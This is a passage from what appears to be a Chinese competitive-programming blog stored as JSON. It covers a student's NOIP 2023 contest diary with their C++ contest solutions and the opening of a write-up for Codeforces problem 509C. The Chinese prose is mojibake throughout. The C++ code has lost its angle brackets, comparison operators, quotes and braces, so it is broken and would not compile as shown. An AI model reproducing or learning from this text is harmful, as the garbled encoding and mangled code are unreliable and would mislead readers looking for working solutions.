çš„åšæ³•ä¹Ÿè›®å¥½æƒ³çš„ã€‚å½“ç„¶ï¼Œæ­£è§£æ˜¯çº¿æ€§åšæ³•ï¼Œå‘ç°ä» $1$ åˆ° $n$ ç»´æŠ¤æ ˆåºåˆ—æ—¶ï¼Œè‹¥å¯¹äºæŸä¸ªæ—¶åˆ» $l$ å’ŒæŸä¸ªæ—¶åˆ» $r$ï¼Œä¸¤ç§æ—¶åˆ»çš„æ ˆåºåˆ—å®Œå…¨ç›¸åŒï¼Œé‚£ä¹ˆè¯´æ˜å­ä¸² $(l+1,r)$ ä¸€å®šæ˜¯å¯æ¶ˆé™¤ã€‚ $\\texttt{T3}$ å¤§æ¨¡æ‹Ÿï¼Œå†™äº†åŠå¤©æ”¾å¼ƒäº†æœ€åä¸€é¢˜ï¼Œæœ€åå› ä¸ºçœ‹é”™ä¸€ä¸¢ä¸¢é¢˜å¹²ï¼Œå–œæ $0 \\texttt{ pts}$ã€‚ä¸è¯´äº†ï¼Œèµ›åå†™äº† $3.02 \\texttt{KB}$ è‹Ÿè¿‡äº†ã€‚æ”¾ä¸ªä»£ç çºªå¿µä¸€ä¸‹ï¼š #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;int n;ll p;//æ‰€æœ‰å˜é‡çš„å†…å­˜æŒ‡é’ˆ struct ele //å®šä¹‰ä¸€ä¸ªå˜é‡ ll len,ali_len;//å æ®ç©ºé—´ å¯¹é½è¦æ±‚ string ty,name;//ç±»å‹ å˜é‡åç§° ;struct stct ll len,ali_len; string name; vector ele v;//è®°å½•ç»“æ„ä½“å†…çš„æ¯ä¸€ä¸ªå˜é‡ stct () len = ali_len = 0;name = ;v.clear (); tot;//è®°å½•æ‰€æœ‰çš„å˜é‡çš„ä¸€ä¸ªå¤§ç»“æ„ä½“ map string,int bs;//4 ä¸ªåŸºæœ¬ç±»å‹map string,stct ext;//è‡ªå®šä¹‰ç±»å‹ void init_basic ();void calc (ll p,ll x);void op_one ();void op_two ();void op_three ();void op_four ();int main ()// freopen (.in,r,stdin);// freopen (.out,w,stdout); cinn;init_basic (); for (int i = 1;i = n;++i) int ty;cinty; if (ty == 1) op_one (); if (ty == 2) op_two (); if (ty == 3) op_three (); if (ty == 4) op_four (); return 0;void init_basic () bs[byte] = 1;bs[short] = 2;bs[int] = 4;bs[long] = 8; void calc (ll poi,ll ali) poi = ceil ((long double) poi / ali) * ali;//å½“å‰åœ°å€ å¯¹é½è¦æ±‚ //tmp è¡¨ç¤ºæ–°çš„ç»“æ„ä½“ nw è¡¨ç¤ºæ–°çš„å˜é‡ void op_one () int k;stct tmp;cintmp.namek; for (int i = 1;i = k;++i) ele nw;cinnw.tynw.name; if (bs[nw.ty]) nw.len = nw.ali_len = bs[nw.ty];//åŸºæœ¬ç±»å‹ else nw.len = ext[nw.ty].len,nw.ali_len = ext[nw.ty].ali_len;//è‡ªå®šä¹‰ç±»å‹ tmp.ali_len = max (tmp.ali_len,nw.ali_len);tmp.v.push_back (nw);//è®¡ç®—å¯¹é½è¦æ±‚ åœ¨ç»“æ„ä½“ä¸­åŠ å…¥å˜é‡ calc (tmp.len,nw.ali_len);tmp.len += nw.len;//åœ°å€åç§»çš„å¤„ç† é•¿åº¦æ›´æ–° calc (tmp.len,tmp.ali_len); ext[tmp.name] = tmp;//åŠ å…¥ä¸€ä¸ªæ–°çš„ç»“æ„ä½“ printf (%lld %lld ,tmp.len,tmp.ali_len); void op_two () ele nw;ll ans = 0;cinnw.tynw.name; for (ele x : tot.v) calc (ans,x.ali_len),ans += x.len; calc (ans,bs[nw.ty] ? bs[nw.ty] : ext[nw.ty].ali_len); tot.v.push_back (bs[nw.ty] ? bs[nw.ty] : ext[nw.ty].len,bs[nw.ty] ? bs[nw.ty] : ext[nw.ty].ali_len,nw.ty,nw.name);//å°†æ–°å˜é‡åŠ å…¥çš„æ€»çš„ç»“æ„ä½“ä¸­ printf (%lld ,ans);void op_three () string s;stct tmp = tot;ll ans = 0;cins; for (int i = 0,j;i s.size ();i = j + 1) j = i; while (j s.size () s[j] != .) ++j; string nw = s.substr (i,j - i);//ä»¥ . åˆ†éš”å±‚å±‚å–å‡ºå˜é‡ for (ele x : tmp.v) calc (ans,x.ali_len); if (x.name == nw) tmp = ext[x.ty];break;//å±‚å±‚æ·±å…¥ ans += x.len; printf (%lld ,ans);void op_four () stct tmp = tot;ll sum = 0,k,ok;cink; while (1) ok = 0; for (ele x : tmp.v) calc (sum,x.ali_len); if (sum = k k sum + x.len)//åœ¨æŸä¸ªå˜é‡çš„åŒºé—´ä¸­ if (bs[x.ty]) ok = 1;break;//æ˜¯æœ€å°å•å…ƒï¼Œè¯´æ˜å­˜åœ¨è§£ tmp = ext[x.ty];//å‘å†…å±‚èµ° ok = 2;break; sum += x.len; if (sum k) ok = 0;break; if (!ok || ok == 1) break; if (!ok) puts (ERR);return ; sum = 0;tmp = tot; while (1) for (ele x : tmp.v) calc (sum,x.ali_len); if (sum = k k sum + x.len) coutx.name; if (bs[x.ty]) puts ();return ; tmp = ext[x.ty];cout.; break; sum += x.len; $\\texttt{T4}$ å…¶å®ä½†å‡¡åšäº†è¿™é¢˜ç›®å¤šå°‘ä¹Ÿå¯å¾—ç‚¹åˆ†ã€‚ï¼ˆåæ‚”.jpg)ã€‚æ ‘ä¸Šçš„äºŒåˆ†å¥—äºŒåˆ†ï¼Œæ˜¾ç„¶äºŒåˆ†å¤©æ•°ä»¥åŠè‡³å°‘è¦ä¸­çš„æ—¶é—´ï¼Œå”¯ä¸€çš„å‘ç‚¹å°±æ˜¯å¯èƒ½çˆ† $\\texttt{long long}$ã€‚ å¾—åˆ†ï¼š$100 + 35 + 0 + 0 = 135$ã€‚ä¸ºä»€ä¹ˆè¦å†™å¤§æ¨¡æ‹Ÿï¼ï¼ï¼ä¸ºä»€ä¹ˆä¸åš $\\texttt{T4}$ï¼ï¼ï¼ã€æ‰€ä»¥ä¾æ—§è·å¾— $2=$ã€‘ $2023.11.8$å¸‚ä¸€æ¨¡è€ƒå®Œï¼Œæ¶¦åˆ°æœºæˆ¿ï¼ï¼ˆå¥ˆæ–¯çš„å®‰æ’ï¼Œç¬¬ä¸‰å¤©ä¸Šåˆå°±è€ƒå®Œï¼ã€ç¬‘æ­»æˆ‘ï¼Œæœ‰çš„äººï¼Œåœ¨åˆ«äººå…¨è€ƒå®Œçš„æ—¶å€™è¿˜æ²¡å¼€å§‹è€ƒâ€¦â€¦ã€‘ï¼‰ ã€$\\texttt{PS}$:å–œæå¹´æ’ $28$ï¼Œ$\\texttt{OI}$ åŠ©æˆ‘ä¸€è‡‚ä¹‹åŠ›ã€‚ã€‘ ä¸‹åˆåšæ´›è°·æ¨¡æ‹Ÿèµ›ã€‚ $\\texttt{T1}$ æ•°è®ºé¢˜ï¼Œç¿»è¯‘ä¸€ä¸‹å°±æ˜¯ç»™é•¿åº¦ä¸º $n$ çš„åºåˆ— $a$ å’Œä¸€ä¸ªæ•° $w$ï¼Œæ¯æ¬¡æ“ä½œä½ å¯ä»¥é€‰æ‹©ä¸€ä¸ª $a_i$ ä½¿å¾— $a_i = a_i + 1$ï¼Œè‡³å¤šæ“ä½œ $w$ æ¬¡ï¼Œæœ€å¤§åŒ– $\\Pi_{i = 1}^{w} a_i$ã€‚åšæ³•å°±æ˜¯è´ªå¿ƒé€‰æ‹©æœ€å°å€¼ï¼Œ$O(n^2)$ å³å¯ã€‚ $\\texttt{T2}$ æ‰¾è§„å¾‹ï¼ˆèµ›æ—¶æ²¡æ‰¾åˆ°ï¼Œå¯„ï¼‰ï¼Œåœ¨ç›´åˆ°è§„å¾‹åï¼Œä»£ç çŸ­çš„ç¦»è°±ã€‚ $\\texttt{T3ï¼ŒT4}$ å¥½åƒæ²¡åšã€‚ $2023.11.12-14$ç¿˜äº†è¿åŠ¨ä¼šï¼Œæ‰“ä¸‰å¥—æ¨¡æ‹Ÿèµ›ï¼Œåš $\\texttt{NOIP}$ æœ€åçš„å†²åˆºã€‚åæ­£æ‰“å¾—ä¸é”™ï¼Œå…·ä½“å°±ä¸å†™äº†ã€‚ $2023.11.18$æ¯”èµ›æ—¥ã€‚ $\\texttt{8:30}$ å¼€å§‹æ¯”èµ›ï¼Œç”¨ç¦æ˜•é˜…è¯»å™¨è§£ç  $\\texttt{pdf}$ å¤šæ¬¡å¤±è´¥ï¼Œåæ¥è¯´è¦ä»æµè§ˆå™¨è¿™é‡Œæ‰“å¼€æ‰è¡Œâ€¦â€¦ $\\texttt{8:35}$ å†™å®Œç¼ºçœï¼Œå¼€å§‹è¯»é¢˜ã€‚ä¼¼ä¹æ˜¯æ¨¡æ‹Ÿ $+$ å›¾è®º $+$ ç›²çŒœæ•°æ®ç»“æ„ $+$ ç›²çŒœæ•°æ®ç»“æ„/åŠ¨æ€è§„åˆ’ï¼ŒçŒœçš„è¿˜æŒºå‡†çš„ã€‚ $\\texttt{8:45}$ å¼€å§‹å†™ $\\texttt{T1}$ï¼ŒçœŸçš„æ˜¯ä¸‰å¹´æ¥æœ€ç®€å•çš„ç­¾åˆ°é¢˜ï¼Œè®°å½•ä¸€ä¸‹æœ€å¤§æœ€å°å€¼ï¼Œç„¶åç›´æ¥ $O(n^2)$ åˆ¤æ–­å³å¯ã€‚ $\\texttt{9:00}$ å†™å®Œï¼Œå¼€å§‹çœ‹ $\\texttt{T2}$ï¼Œå‘ç°æœ‰ $\\texttt{40 pts}$ æ˜¯é€çš„ï¼Œç›´æ¥æ•²ã€‚ç„¶åå¼€å§‹æƒ³æ­£è§£ï¼Œå…¶é—´ä¸€ç›´æ²¡ç”¨æƒ³é€šä¸€ä¸ªèƒ½æˆç¯çš„æ ·ä¾‹ï¼Œæ‰€ä»¥ä¸€ç›´æ‰‹æ¨¡æ„é€ ï¼Œå¥½åƒèŠ±äº†å¾ˆä¹…ï¼Œç„¶åå°è¯•å†™äº†ä»£ç ï¼Œä½†æ˜¯ä¸€ç›´å‡ºä¸æ¥ã€‚ä»£ç è¶Šæ”¹è¶Šä¹±ï¼Œå¤§æ ·ä¾‹å…¨è¿‡ä¸äº†ï¼Œç¨å¾®æœ‰ç‚¹æ…Œã€‚è¿™æ—¶å€™å¤§æ¦‚å·²ç» $\\texttt{10:20}$ çš„æ ·å­äº†ï¼Œå¸å–äº†ä¹‹å‰çš„æ•™è®­ï¼Œå‡ºå»ä¸Šäº†ä¸ªå•æ‰€ï¼Œç›´æ¥å¼€å†™ $\\texttt{T3}$ã€‚ æƒ³åˆ°ä¸€ä¸ª $\\texttt{35 pts}$ çš„æœ´ç´  $\\texttt{dp}$ï¼Œè®¾ $dp_{i,j}$ è¡¨ç¤º $X$ åŒ¹é…åˆ°ç¬¬ $i$ ä½ï¼Œ$Y$ åŒ¹é…åˆ°ç¬¬ $j$ ä½æ˜¯å¦å¯è¡Œï¼Œæ‰€ä»¥å°±æœ‰è½¬ç§» $dp_{i,j} = dp_{i - 1,j} | dp_{i,j - 1} | dp_{i - 1,j - 1}$ã€‚æ•´ä¸€ä¸ªæƒ³å®Œå†™å®Œå¤§æ¦‚ $\\texttt{11:40}$ï¼Œæ‹äº†å¤§æ ·ä¾‹ï¼Œèƒ½è¿‡ï¼Œä¸€é˜µç‹‚å–œï¼Œç„¶åå¼€æœ€åä¸€é¢˜ã€‚ æŒ‰ç…§èµ›å‰â€œæ²¡æ€è·¯å°±å†™ $\\texttt{dp}$â€çš„ç­–ç•¥ï¼Œå¾ˆå¿«æƒ³å‡ºä¸€ä¸ª $\\texttt{36 pts}$ çš„ $\\texttt{dp}$ï¼Œ$dp_{i,j}$ è¡¨ç¤ºåˆ°ç¬¬ $i$ å¤©æ—¶ï¼Œ$(j,i)$ åŒºé—´å‡æ‰“å¡è€Œç¬¬ $j - 1$ å¤©ä¸æ‰“å¡çš„æœ€å¤§èƒ½é‡ã€‚å·®ä¸å¤š $\\texttt{12:30}$ï¼Œæµ‹å¤§æ ·ä¾‹ï¼Œçªç„¶å‘ç°æœ‰é—®é¢˜ã€‚ä¸€é¡¿æ£€æŸ¥åå‘ç°æ˜¯åˆå§‹åŒ–çš„é”…ï¼Œä¿®äº†ä»¥åæ‰€ä»¥å¤§æ ·ä¾‹éƒ½èƒ½è¿‡ã€‚å†™å®Œä»¥åæ€•è¢«å¡å¸¸ï¼Œåœ¨åˆ¤æ–­ $(j,i)$ åŒºé—´çš„ä»£ç ä¸­åˆ©ç”¨ vector åŠ äº†ä¸€ä¸ªäºŒåˆ†ï¼Œæ”¹å®Œä»¥åç»§ç»­æŒ‰åŸç¨‹åºå¯¹æ‹ï¼Œè¿˜çœŸä¸ªæˆ‘æ‹å‡ºé”™æ¥äº†ï¼Œå‘ç°è¿˜æ˜¯åˆå§‹åŒ–çš„é—®é¢˜ï¼Œèµ¶ç´§æ”¹ï¼ $\\texttt{12:45}$ï¼Œä¸å†™äº†ï¼Œå¼€å§‹æ£€æŸ¥æ–‡ä»¶åï¼Œè·¯å¾„ï¼Œfreopen ç­‰ç­‰ã€‚ $\\texttt{13:00}$ï¼Œæ¯”èµ›ç»“æŸï¼Œæ„Ÿè§‰è¿˜è¡Œï¼Œä¼°åˆ† $100 + 40 + 25 + 36 = 211$ã€‚ åè®° è¿™åœºæ¯”èµ›è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹ä¸æ»¡æ„ã€‚$\\texttt{T2}$ åº”è¯¥æ˜¯è¦å†™å‡ºæ¥çš„ï¼Œè€ƒåœºä¸Šæƒ³å¾—å¤ªä¹±æŠŠè‡ªå·±ç»•è¿›å»äº†ã€‚$\\texttt{T4}$ è¿˜æœ‰ç¦»æ•£åŒ–çš„é‚£ä¸€éƒ¨åˆ†åˆ†æ²¡çœ‹è§ï¼Œè¿™æ˜¯å¯ä»¥æ‹¿åˆ°çš„ï¼›å¥½åƒè¿˜æœ‰ $\\texttt{10 pts}$ çš„ç‰¹æ®Šéƒ¨åˆ†ä¹Ÿæ²¡çœ‹è§â€¦â€¦ æ„Ÿè°¢ $\\texttt{CCF}$ æ²¡æœ‰å¡ $\\texttt{T3}$ çš„å¤§å¸¸æ•°åšæ³•ï¼ˆè™½ç„¶èƒ½å¤Ÿé€šè¿‡è¯»å…¥æ—¶çš„ç‰¹åˆ¤è§£å†³è¿™ä¸ªé—®é¢˜ï¼‰ã€‚ä»¥åŠ $\\texttt{T2}$ æš´åŠ›ä¸å°å¿ƒæŠŠ $n$ æ‰“æˆäº† $m$ï¼Œä½†ç”±äºæš´åŠ›è‚¯å®šæ˜¯å¡æ»¡çš„ï¼Œæ‰€ä»¥å‡ºçš„æ•°æ®å…¨éƒ¨éƒ½ $n = m$ï¼ˆå±äºæ˜¯é€ƒè¿‡ä¸€åŠ«äº†ï¼‰ã€‚ å‡ºåˆ†å•¦ï¼Œå’Œè‡ªå·±ä¼°çš„ä¸€æ¯›ä¸€æ ·ã€‚æ„Ÿè§‰æœ‰ç‚¹æ‚¬ï¼Œç¥ˆç¥·åˆä¸­ç”Ÿèƒ½å»é™¤çš„å¤šä¸€ç‚¹ã€‚ å‡ºåˆ†æ•°çº¿å•¦ï¼$206$ï¼ç»ˆäºç»ˆäºç»ˆäºä¸€ç­‰å¥–å˜ï¼ï¼ï¼ä¸Šä½“è‚²è¯¾å‰åŒå­¦æ¥å‘Šè¯‰æˆ‘çš„ï¼Œè®©æˆ‘ç»™æ¿€åŠ¨å¾—ä¸å¾—äº†ã€‚ åˆé«˜ä¸­çš„ $\\texttt{OI}$ æ€»ç®—æœ‰äº†é—­ç¯ï¼Œæˆ–è®¸æ•´ä¸ªè¿‡ç¨‹çœ‹ä¸Šå»å¾ˆè‰°éš¾ï¼Œç»å†äº†åœæ–‡åŒ–è¯¾ï¼Œæ¯”èµ›å¤±åˆ©ç­‰å›°éš¾ï¼Œä½†æ˜¯æˆ‘çœŸçš„ä¹åœ¨å…¶ä¸­ã€‚ä¸è®ºæ˜¯æ´›è°·çš„æœˆèµ›ï¼Œè¿˜æ˜¯ $\\texttt{CF}$ çš„æ·±å¤œé–æˆ˜ï¼Œæ€»ä¹‹åŠªåŠ›æ²¡æœ‰ç™½è´¹ï¼ï¼ï¼ é«˜ä¸­çš„ç«èµ›ç®—æ˜¯ç»“æŸäº†ï¼Œä½†æ˜¯æ´›è°·çš„è´¦å·æˆ‘æ˜¯ä¸ä¼šåºŸæ»´ï¼Œå¸Œæœ›æˆ‘åœ¨å¤§å­¦æ˜¯èƒ½å‚åŠ  $\\texttt{ACM}$ï¼Œç„¶åç»§ç»­å¼€å§‹å†™æˆ‘çš„é¢˜è§£ï¼Œèµšæˆ‘çš„å’•å€¼ï¼Œæå‡æˆ‘çš„æ’åï¼ï¼ï¼ æœ€åæœ€åï¼Œçºªå¿µä¸€ä¸‹æˆ‘æ¯”èµ›çš„å››é“é¢˜çš„èµ›æ—¶ä»£ç ã€‚ //T1 #include bits/stdc++.h#define ll long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 3e3 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,mx[MAX],mn[MAX];char s[MAX][MAX];int main () n = read ();m = read (); for (int i = 1;i = n;++i) mn[i] = INF; for (int i = 1;i = n;++i) scanf (%s,s[i] + 1); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) mx[i] = max (mx[i],s[i][j] - a),mn[i] = min (mn[i],s[i][j] - a); for (int i = 1;i = n;++i) int ok = 1; for (int j = 1;j = n;++j) if (i == j) continue; if (mn[i] = mx[j]) ok = 0;break; if (ok) printf (1); else printf (0); puts (); return 0;inline int read () int s = 0,f = 1; char ch = getchar (); while ((0 ch || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (0 = ch ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;//T2#include bits/stdc++.h#define ll long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int ty,t,n,m,cnt,ans,vis[MAX],a[MAX],b[MAX],st[MAX];//st[i] for i,the prioritychar str[30][2];int x[30],y[30];vector pair int,int ve[MAX];void dfs (int u,int ti);void solve (int x);bool check ();int main ()// freopen (tribool.in,r,stdin);// freopen (tribool.out,w,stdout); ty = read ();t = read (); if (ty = 2) while (t--) n = read ();m = read ();ans = INF; for (int i = 1;i = m;++i) scanf (%s,str[i]);x[i] = read (); if (str[i][0] == + || str[i][0] == -) y[i] = read (); solve (1); printf (%d ,ans); return 0; while (t--) n = read ();m = read ();cnt = 0; for (int i = 1;i = n;++i) a[i] = 0,st[i] = 0,ve[i].clear (); for (int i = 1;i = m;++i) char s[2];scanf (%s,s); if (s[0] == +) int x = read (),y = read (); ve[y].push_back (x,i); st[x] = i; for (int j = 1;j = n;++j) vis[j] = 0; dfs (y,i); else if (s[0] == -) int x = read (),y = read (); else int x = read (); if (s[0] == T) a[x] = 1; if (s[0] == F) a[x] = 2; if (s[0] == U) a[x] = 3; if (ty = 5) st[x] = i; for (int j = 1;j = n;++j) vis[j] = 0; dfs (x,i); for (int i = 1;i = n;++i) if (a[i] == 3) ++cnt; printf (%d ,cnt); return 0;inline int read () int s = 0,f = 1; char ch = getchar (); while ((0 ch || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (0 = ch ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void dfs (int u,int ti) vis[u] = 1; for (int i = 0;i ve[u].size ();++i) int v = ve[u][i].first; if (vis[v] || st[v] != ve[u][i].second) continue; a[v] = a[u];//st[v] = ti; dfs (v,ti); void solve (int x) if (x == n + 1) if (check ()) int sum = 0; for (int i = 1;i = n;++i) sum += (a[i] == 3); ans = min (ans,sum); return ; for (int i = 1;i = 3;++i) a[x] = i,solve (x + 1);bool check () for (int i = 1;i = n;++i) b[i] = a[i]; for (int i = 1;i = m;++i) if (str[i][0] == +) b[x[i]] = b[y[i]]; else if (str[i][0] == -) if (b[y[i]] == 3) b[x[i]] = b[y[i]]; else b[x[i]] = 3 - b[y[i]]; else if (str[i][0] == F) b[x[i]] = 1; if (str[i][0] == T) b[x[i]] = 2; if (str[i][0] == U) b[x[i]] = 3; for (int i = 1;i = n;++i) if (a[i] != b[i]) return 0; return 1;//T3#include bits/stdc++.h#define ll long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e3 + 5;const int MOD = 1e9 + 7;inline int read ();int ty,n,m,q,ans,a[MAX],b[MAX],c[MAX],d[MAX],dp[MAX][MAX];bool check1 ();bool check2 ();int main ()// freopen (expand.in,r,stdin);// freopen (expand.out,w,stdout); ty = read ();n = read ();m = read ();q = read (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = m;++i) b[i] = read (); if (a[1] b[1]) ans = check1 (); else ans = check2 (); printf (%d,ans); while (q--) int dx = read (),dy = read (); for (int i = 1;i = n;++i) c[i] = a[i]; for (int i = 1;i = m;++i) d[i] = b[i]; while (dx--) int x = read (),y = read (); a[x] = y; while (dy--) int x = read (),y = read (); b[x] = y; if (a[1] b[1]) ans = check1 (); else ans = check2 (); printf (%d,ans); for (int i = 1;i = n;++i) a[i] = c[i]; for (int i = 1;i = m;++i) b[i] = d[i]; puts (); return 0;inline int read () int s = 0,f = 1; char ch = getchar (); while ((0 ch || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (0 = ch ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool check1 () for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) dp[i][j] = 0; dp[1][1] = (a[1] b[1]); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) if (i == 1 j == 1) continue; if (a[i] = b[j]) continue; dp[i][j] |= dp[i][j - 1]; dp[i][j] |= dp[i - 1][j - 1]; dp[i][j] |= dp[i - 1][j]; return dp[n][m];bool check2 () for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) dp[i][j] = 0; dp[1][1] = (a[1] b[1]); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) if (i == 1 j == 1) continue; if (a[i] = b[j]) continue; dp[i][j] |= dp[i][j - 1]; dp[i][j] |= dp[i - 1][j - 1]; dp[i][j] |= dp[i - 1][j]; return dp[n][m];//T4#include bits/stdc++.h#define ll long long#define INF 0x3f3f3f3f3f3f3f3fusing namespace std;const int MAX = 1e3 + 5;const int MOD = 1e9 + 7;inline int read ();struct node int ti;ll v; ;int ty,t,n,m,k,d;ll ans,dp[MAX][MAX];vector node p[MAX];vector ll sum[MAX];bool cmp (node x,node y);ll check (int x,int y);int main ()// freopen (run.in,r,stdin);// freopen (run.out,w,stdout); ty = read ();t = read (); while (t--) n = read ();m = read ();k = read ();d = read (); for (int i = 1;i = n;++i) for (int j = 0;j = min (n,k);++j) dp[i][j] = -INF; ans = -INF; for (int i = 1;i = m;++i) int x = read (),y = read (),v = read (); p[x].push_back (x - y + 1,v); for (int i = 1;i = n;++i) sort (p[i].begin (),p[i].end (),cmp); for (int i = 1;i = n;++i) if (!p[i].size ()) continue; sum[i].push_back (p[i][0].v); for (int j = 1;j p[i].size ();++j) sum[i].push_back (sum[i][j - 1] + p[i][j].v); dp[0][0] = 0; for (int i = 1;i = n;++i) for (int j = 0;j = min (i,k);++j) int l = max (i - j + 1,1),r = i; dp[i][0] = max (dp[i][0],dp[i - 1][j]); if (j) dp[i][j] = max (dp[i][j],dp[i - 1][j - 1] + check (l,r) - d); for (int i = 0;i = min (n,k);++i) ans = max (ans,dp[n][i]); printf (%lld ,ans); for (int i = 1;i = n;++i) p[i].clear (),sum[i].clear (); for (int i = 1;i = n;++i) for (int j = 0;j = min (n,k);++j) dp[i][j] = -INF; return 0;inline int read () int s = 0,f = 1; char ch = getchar (); while ((0 ch || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (0 = ch ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (node x,node y) return x.ti y.ti;ll check (int x,int y) int l = 0,r = p[y].size () - 1,ans = -1; while (l = r) int mid = (l + r) 1; if (x = p[y][mid].ti) ans = mid,r = mid - 1; else l = mid + 1; if (ans == -1) return 0; if (ans == 0) return sum[y][sum[y].size () - 1]; else return sum[y][sum[y].size () - 1] - sum[y][ans - 1];","categories":["Journal"]},{"title":"é¢˜è§£ï¼šCF509C Sums of Digits","path":"/2023/05/21/CF509C/","content":"ä¸€é“å¾ˆå¥½çš„æ„é€ é¢˜ã€‚ç®€å•æ¥è¯´ï¼Œç»™ä½ ä¸€ä¸ªåºåˆ— $\\{b\\}$ï¼Œ$b_i$ è¡¨ç¤º $a_i$ å„ä½æ•°å­—ä¹‹å’Œï¼Œè¯·è¿˜åŸå‡ºåºåˆ— $\\{a\\}$ã€‚æœ‰ä¸¤ä¸ªé™„åŠ æ¡ä»¶ï¼Œä¸€æ˜¯åºåˆ— $\\{a\\}$ å•å¢ï¼ŒäºŒæ˜¯ $\\{a\\}$ å°½å¯èƒ½çš„å°ã€‚ å¯¹äºç¬¬äºŒä¸ªæ¡ä»¶ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°è¦è´ªå¿ƒæ±‚è§£ã€‚å€˜è‹¥æ²¡æœ‰ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼Œé‚£ä¹ˆæ˜¾ç„¶ $b_i = 9a+b(0b9)$ çš„å½¢å¼æ˜¯æœ€ä¼˜çš„ï¼Œå³è¿˜åŸå‡ºçš„æ•°å½¢å¦‚ $b99\\cdots9$ã€‚é‚£ä¹ˆæœ‰ç¬¬ä¸€ä¸ªæ¡ä»¶æ—¶ï¼Œä¸éš¾æƒ³åˆ°æ ¹æ® $b_{i - 1}$ ä¸ $b_i$ çš„å¤§å°è¿›è¡Œåˆ†ç±»è®¨è®ºã€‚ å…ˆä» $b_{i - 1} b_i$ è¿™ç§ç®€å•çš„æƒ…å†µçœ‹èµ·ã€‚ç›¸è¾ƒäºå‰ä¸€ä¸ªæ•°ï¼Œåªéœ€è¦æŠŠå¤šçš„éƒ¨åˆ† $b_i - b_{i - 1}$ æŒ‰ç…§è´ªå¿ƒçš„æ€æƒ³å»å¡«å…¥å³å¯ã€‚ä¸¾ä¸ªæ —å­ï¼Œå¦‚æœ $a_{i - 1} = 129$ï¼Œå¤šå‡ºäº† $8$ éœ€è¦å¡«ï¼Œé‚£ä¹ˆåœ¨ $2$ ä¸ŠåŠ ä¸Š $7$ è¡¥æˆæœ€å¤§çš„ä¸Šé™ $9$ï¼Œç„¶åå°†å‰©ä½™çš„ $8 - 7 = 1$ å¡«å…¥ $1$ï¼Œæœ€åå˜æˆäº† $299$ã€‚ å†æ¥çœ‹ $b_{i - 1} \\ge b_i$ çš„æƒ…å†µã€‚ä»ä½ä½å¾€é«˜ä½æ‰¾åˆ°ç¬¬ä¸€ä¸ªä¸æ˜¯ $9$ çš„ä½ç½®ï¼Œå°è¯•å°†è¯¥ä½åŠ  $1$ï¼Œå¾€é«˜ä½çš„æ–¹å‘å‡ä¸å˜ï¼Œå¾€ä½ä½çš„æ–¹å‘é‡æ–°æ’åˆ—ã€‚è¿™é‡Œéœ€è¦æ³¨æ„æ˜¯å¦åˆæ³•ï¼ˆä¹Ÿå°±æ˜¯å‰©ä½™æ•°å­—ä¹‹å’Œåœ¨å‡å»é‚£äº›å·²ç»ç¡®å®šçš„æ•°åæ˜¯å¦å¤§äºç­‰äº $0$ï¼‰ã€‚å½“ç„¶ï¼Œå¾€ä½ä½çš„æ–¹å‘çš„æ’åˆ—æ–¹å¼ç›´æ¥æŒ‰ç…§è´ªå¿ƒçš„æ€è·¯å³å¯ã€‚è‹¥ä½æ•°ä¸å¤Ÿï¼Œåˆ™éœ€è¦è¡¥ $0$ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¹‹å‰åˆ¤æ–­åˆæ³•æ—¶åªéœ€è¦æ»¡è¶³å¤§äºç­‰äº $0$ å³å¯ã€‚å¦‚æœå…¨éƒ¨éå†å®Œä¹Ÿæœªå‡ºç°å¯ä»¥å¡«çš„ï¼Œé‚£ä¹ˆåªèƒ½æ–°å¼€ä¸€ä½å¹¶å¡«ä¸Š $1$ï¼Œç„¶åå‰©ä¸‹çš„æŒ‰ç…§è´ªå¿ƒçš„æ€è·¯å³å¯ã€‚ åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™ï¼Œåˆ†ç±»ä¸‰ç§æ„é€ çš„å‡½æ•°ã€‚ç¬¬ä¸€ç§æ˜¯æ— æ¡ä»¶é™åˆ¶ï¼Œç›´æ¥è´ªå¿ƒå¡«å…¥ã€‚ç¬¬äºŒç§æ˜¯å¼±ä¾èµ–ï¼Œå³éœ€è¦è¡¥å……å¤šçš„éƒ¨åˆ†çš„ç¬¬ä¸€ç§æƒ…å†µã€‚ç¬¬ä¸‰ç§ä¾¿æ˜¯éœ€è¦è¾ƒå¤§æ”¹åŠ¨çš„ç¬¬äºŒç§æƒ…å†µï¼Œå…¶ä¸­æŒ‰ç…§è´ªå¿ƒè¿›è¡Œå¡«å…¥çš„éƒ¨åˆ†ç›´æ¥è°ƒç”¨ç¬¬ä¸€ä¸ªå‡½æ•°å³å¯ã€‚ å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,a[MAX];string ans[MAX];string easy_make (int x);string medium_make (string la,int x);string hard_make (string la,int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = 